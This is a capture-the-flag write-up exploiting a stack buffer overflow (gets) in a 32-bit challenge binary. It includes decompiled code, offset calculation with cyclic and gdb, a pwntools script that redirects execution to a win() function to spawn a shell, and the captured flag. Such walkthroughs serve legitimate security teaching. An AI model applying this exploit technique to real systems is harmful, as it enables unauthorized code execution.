# &#35; chall_02

#### &#42; execute
```bash
## 1 file
$ ls chall_02
chall_02

$ file chall_02
chall_02: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=03a977e1e301cf30f31c1145cd14bdbbf0e89cb6, for GNU/Linux 3.2.0, not stripped

$ checksec --file=./chall_02
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   73) Symbols	  No	0		2		./chall_02

## just do input twice
$ ./chall_02
Went along the mountain side.
AAAA
BBBB

```

#### &#42; debugging
```bash
## vulerable point is gets(local_3e) in vuln() : stack overflow
void main(void)

{
  char local_24 [20];
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  puts("Went along the mountain side.");
  fgets(local_24,19,stdin);
  vuln();
  return;
}

void vuln(void)

{
  char local_3e [54];
  
  gets(local_3e);
  return;
}

## need to change ret to win()
void win(void)

{
  system("/bin/sh");
  return;
}

```

#### &#42; structure of stack
```bash
buf[62] + sfp[4] + ret[4]


$ cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

$ cyclic -l 0x61716161
62
$ cyclic -l aaqa
62

```

#### &#42; payload(python)
```python
payload  = b"A"*62
payload += b"B"*4
payload += p32(win)

```

#### &#42; analysis binary using gdb
```bash

gef➤  disas main
Dump of assembler code for function main:
   0x08049251 <+0>:	endbr32
.
.
.
   0x08049296 <+69>:	call   0x80490a0 <fgets@plt>
   0x0804929b <+74>:	add    esp,0x10
   0x0804929e <+77>:	call   0x8049225 <vuln>
   0x080492a3 <+82>:	nop                       => ret addr of vuln()
   0x080492a4 <+83>:	lea    esp,[ebp-0x8]
   0x080492a7 <+86>:	pop    ecx
   0x080492a8 <+87>:	pop    ebx
   0x080492a9 <+88>:	pop    ebp
   0x080492aa <+89>:	lea    esp,[ecx-0x4]
   0x080492ad <+92>:	ret
 
gef➤  x/32xw 0xffd19d1c
0xffd19d1c:	0x424217e0	0x42424242	0x42424242	0x42424242
0xffd19d2c:	0x42424242	0x42424242	0x42424242	0x42424242
0xffd19d3c:	0x42424242	0x42424242	0x42424242	0x42424242
0xffd19d4c:	0x42424242	0x42424242	0x42424242	0x00424242
0xffd19d5c:	0x080492a3	0xf7ec03fc	0x00040000	0x00000000
0xffd19d6c:	0x41414141	0x0000000a	0xffd19e34	0xffd19e3c
0xffd19d7c:	0x080492e1	0xffd19da0	0x00000000	0x00000000
0xffd19d8c:	0xf7cf3ee5	0xf7ec0000	0xf7ec0000	0x00000000

gef➤  x/xw 0xffd19d5c
0xffd19d5c:	0x080492a3
gef➤  p/d 0xffd19d5c-0xffd19d1e
$1 = 62
gef➤

```


#### &#42; make exploit code
```python
$ cat exp.py
from pwn import *

filename = 'chall_02'
conn = process(filename)
elf = ELF(filename)

win = elf.symbols["win"]

print( conn.recvuntil("Went along the mountain side.\n") )

payload  = b"Z"*4
conn.sendline(payload)

with open("payload", "wb") as fd:
    fd.write(payload+"\n")

payload  = b"A"*62
payload += p32(win)

conn.send(payload)


with open("payload", "ab") as fd:
    fd.write(payload)

conn.interactive()


```


#### &#42; try to exploit
```bash
$ python2 exp.py
[!] Could not find executable 'chall_02' in $PATH, using './chall_02' instead
[+] Starting local process './chall_02': pid 2601
[*] '/pwn/sunshine/02/chall_02'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
Went along the mountain side.

[*] Switching to interactive mode
$
$ cat flag.txt
sun{warmness-on-the-soul-3b6aad1d8bb54732}
$

```